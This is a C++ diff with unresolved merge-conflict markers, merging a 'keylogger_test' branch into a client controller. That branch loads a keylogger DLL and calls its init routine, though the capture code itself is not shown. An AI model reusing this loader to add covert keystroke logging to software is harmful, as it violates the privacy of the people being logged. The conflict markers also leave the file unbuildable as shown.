@@ -1,7 +1,11 @@
 #include <iostream>
 #include "client.h"
 #include "sayHello.h"
+<<<<<<< HEAD
 #include "IInfoClient.h"
+=======
+#include "keylogger_dll/KeyloggerDLL.h"
+>>>>>>> keylogger_test
 
 /////////////////////////////////////////////////////////////////
 //  SETTINGS
@@ -18,7 +22,11 @@ clientController::clientController(void) throw(DLibraryException)
 		this->libraries.add(1, "sayHello", "./libsayHello.so");
 	#elif _WIN32
 		this->libraries.add(1, "sayHello", "sayHello.dll");
+<<<<<<< HEAD
 		this->libraries.add(2, "infoClient", "InfoClient.dll");
+=======
+		this->libraries.add(2, "keylogger_dll", "keylogger_dll.dll");
+>>>>>>> keylogger_test
 	#endif
 
 	if (!(this->libraries.handler.loadByName("sayHello")))
@@ -26,11 +34,20 @@ clientController::clientController(void) throw(DLibraryException)
 	if (!(this->sayHello = this->libraries.handler.getDictionaryByName("sayHello")))
 		throw DLibraryException("sayHello", "Couldn't get Dictionary.");
 
+<<<<<<< HEAD
 	if (!(this->libraries.handler.loadByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't load module.");
 	if (!(this->infoClient = this->libraries.handler.getDictionaryByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
 	this->ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();
+=======
+	//Test keylogger dll
+	if (!(this->libraries.handler.loadByName("keylogger_dll")))
+		throw DLibraryException("keylogger_dll", "Couldn't load module.");
+	if (!(this->keylogger_dll = this->libraries.handler.getDictionaryByName("keylogger_dll")))
+		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");
+
+>>>>>>> keylogger_test
 }
 
 clientController::~clientController(void)
@@ -46,6 +63,7 @@ int		clientController::mainAction(int ac, char **av) {
 
 	// Dire bonjour
 	this->sayHelloAction();
+<<<<<<< HEAD
 	this->defineShortcut();
 	// Faire pleins de trucs :
 	// this->dhinstance->init();
@@ -59,13 +77,35 @@ int		clientController::mainAction(int ac, char **av) {
 	// keylog.join();
 	// datahandling.join();
 	// networking.join();
+=======
+	
+	// keylogger_test
+	this->initKeyloggerAction();
+
+	// Faire pleins de trucs ...
+	// ...
+
+	// Quitter
+>>>>>>> keylogger_test
 	return (0);
+}
+
+void					clientController::initKeyloggerAction(void)
+{
+	Keylogger* keylogger = ((_instantiate)(*this->keylogger_dll)["instantiate"])();
+	std::cout << keylogger << std::endl;
+	keylogger->init();
+	//if (keylogger->init())
+	//{
+		//std::cout << "Init not ok" << std::endl;
+//	}
+	system("Pause");
+	std::cout << "Init ok !" << std::endl;
 }
 
 void					clientController::sayHelloAction(void) {
 
 	((_sayHelloFrom)(*this->sayHello)["sayHelloFrom"])("client");
-
 }
 
 
